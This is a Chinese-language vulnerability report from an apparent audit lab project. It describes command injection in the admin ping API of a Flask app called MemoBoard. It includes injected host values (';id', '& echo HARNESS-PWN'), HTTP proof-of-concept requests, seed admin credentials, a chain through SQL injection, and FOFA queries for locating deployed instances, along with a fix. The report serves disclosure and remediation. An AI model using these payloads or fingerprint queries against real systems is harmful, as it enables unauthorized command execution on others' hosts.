---
title: "MemoBoard admin ping 接口命令注入导致 RCE"
summary: "GET /api/tools/ping?host= → ping_host → subprocess.getoutput 拼接 shell"
---

# MemoBoard admin ping 接口命令注入导致 RCE

## 漏洞描述

MemoBoard 是一款基于 Flask 的内网备忘录看板应用。

管理员接口 `GET /api/tools/ping` 把 `host` 拼进 shell 字符串，经 `subprocess.getoutput` 执行，构成命令注入。

## 漏洞危害

- 已证明危害：持有 admin 会话即可执行任意系统命令，并在 HTTP 正文读到回显。
- 潜在危害：可与未授权 SQLi（拖取 admin 密码）或种子凭据串联，从匿名访问打到主机控制。
- SQL 注入须明确：是否能获取 OS-Shell：不适用
- SSRF 须明确：观察面：不适用

## 漏洞厂商全称

MemoBoard（VulnHunter 白盒审计靶场项目）

## 已知受影响产品及版本

MemoBoard v0.5.0（`board/__init__.py` `__version__ = "0.5.0"`）

## 互联网资产证明
> 用于在公开资产测绘平台定位同类应用资产；优先使用应用自身稳定特征，不把漏洞路径、PoC 参数或一次性业务数据当作唯一指纹。测绘语句不允许出现「或」关系。

### 精准测绘语法

#### FOFA
```text
title="MemoBoard notes" && icon_hash="-151231234" && body="MemoBoard"
```

#### X 情报社区
```text
title="MemoBoard notes" && app="MemoBoard notes" && icon_hash="-151231234"
```

## 漏洞技术细节

### Source → Sink

- Source：`GET /api/tools/ping?host=`（`src/app.py:97` `api_ping`，要求 `session["role"]=="admin"`）
- 传递：`host = request.args.get("host", "127.0.0.1")` → `ping_host(host)`
- Sink：`src/board/engine.py:79` `subprocess.getoutput(f"echo MEMO-PING {host}")`（`shell=True`），回显写入 HTTP 正文

### 漏洞代码

- 完整路径：`src/board/engine.py:77`

```python
def ping_host(host: str) -> str:
    # Host is interpolated into a shell command and the output is returned.
    return subprocess.getoutput(f"echo MEMO-PING {host}")
```

### 完整 PoC 描述

可运行脚本见同目录 `poc.py`（`python poc.py -u <目标> -c <命令>`；须支持 `--proxy`；输出默认英语，`--zh` 切中文）。未给密码时脚本会先打 SQLi 拖 admin 口令再登录。

```http
POST /api/login HTTP/1.1
Host: TARGET:5000
Content-Type: application/json
Connection: close

{"username":"admin","password":"admin123"}
```

```http
GET /api/tools/ping?host=;id HTTP/1.1
Host: TARGET:5000
Cookie: session=<admin_session_cookie>
Connection: close
```

### 触发条件

需管理员会话。默认配置即可。admin 会话可通过种子凭据 `admin/admin123` 或同项目未授权 SQLi 获取；那是独立前提，本条本身按后台管理员计。

## 同根因受影响点

- `src/board/engine.py:79` `ping_host` — `getoutput` 拼接 shell（代表点）
- `src/app.py:97` `api_ping` — 把用户可控 `host` 传入 sink 并返回输出

## 复现证明

### 基础环境搭建

动态环境尚未落盘，见 `docs/lab.md`。本项目验证方式为局部验证（harness）。

### 漏洞触发操作

#### 局部验证（harness）

harness 脚本（`harness.py`）在沙箱中执行结果如下（粘贴 stdout 关键输出，截取关键行）：

```text
Benign host=127.0.0.1 -> 'MEMO-PING 127.0.0.1'
Inject host=;id -> 'MEMO-PING ;id'
Inject host=& echo HARNESS-PWN -> 'MEMO-PING \nHARNESS-PWN'
Command injection confirmed with payload & echo HARNESS-PWN
MEMO-PING 
HARNESS-PWN
```

Linux 沙箱上 `;id` 同样会在 `MEMO-PING` 之后打出 `uid=` 回显。

**为何 harness 能证明漏洞存在**：harness 抽出与源码相同的 `ping_host`，把 `host` 拼进 `echo MEMO-PING {host}` 交给 `getoutput`。良性输入只有一行回显；`& echo HARNESS-PWN` / `;id` 会多出注入命令的运行时输出。这对应 `shell=True` 把元字符当语法执行，而不是 argv 数据。

#### 动态验证（靶场 PoC）

本条以 harness 确认。对已运行实例可用同目录 `poc.py` 复测：

```http
GET /api/tools/ping?host=;id HTTP/1.1
Host: TARGET:5000
Cookie: session=<admin_session_cookie>
Connection: close
```

```text
python poc.py -u http://TARGET:5000
python poc.py -u http://TARGET:5000 --zh
python poc.py -u http://TARGET:5000 --proxy http://127.0.0.1:8080
python poc.py -u http://TARGET:5000 -c "id"
```

**为何 PoC 能利用该漏洞**：登录后查询参数 `host` 进入 `ping_host`，shell 元字符把后续片段当成新命令。成功时正文第一行是 `MEMO-PING`，后续行为命令回显（PoC 以 `Command output:` 打印）。

### 预期证据

响应含注入命令的实际输出（Linux 下如 `uid=` 行；Windows 下如额外的 `HARNESS-PWN` / `whoami` 行）。不要把未登录 401/403 当成 RCE 成功。

### 复现注意事项

本条是后台管理员 RCE，不要标成未认证前台。串联 SQLi 拿会话是另一条链。

## 修复方案

使用参数列表调用且 `shell=False`，并对 `host` 做 IP/域名白名单。

```python
def ping_host(host: str) -> str:
    result = subprocess.run(
        ["ping", "-c", "1", host],
        capture_output=True,
        text=True,
        timeout=5,
    )
    return result.stdout
```

## 备注

可与 `GET /api/users` SQL 注入串联：拖 admin 密码 → 登录 → ping RCE。

---

## 审核标注

- 攻击面：后台
- 所需账号：管理员
- 配置前提：默认配置
- 严重度：高危（high）
- CVSS 3.1：7.2
- 评分向量：CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
- CVSS 4.0：8.6
- CVSS 4.0 向量：CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
- 价值分层：有 CVE 价值（cve_candidate）
- 分层理由：Authenticated admin can inject shell metacharacters into the ping host parameter, achieving full RCE with command output echoed back in the HTTP response. The admin session is obtainable via the unauthenticated SQLi on /api/users (chained attack), making this reachable from anonymous access. Classic command injection with clear RCE impact — CVE-worthy.
- 根因合并键：rce:ping_host
